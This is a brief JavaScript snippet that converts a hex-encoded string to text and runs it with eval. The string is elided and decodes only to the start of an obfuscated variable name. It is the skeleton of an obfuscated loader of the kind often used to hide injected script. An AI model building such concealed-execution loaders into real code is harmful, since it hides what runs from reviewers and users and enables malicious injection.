(function() {
    var z = "";
    var b = "766172205f3078666.....";
    eval((function() {
        for (var i = 0; i < b.length; i += 2) {
            z += String.fromCharCode(parseInt(b.substring(i, i + 2), 16));
        }
        return z;
    })());
})();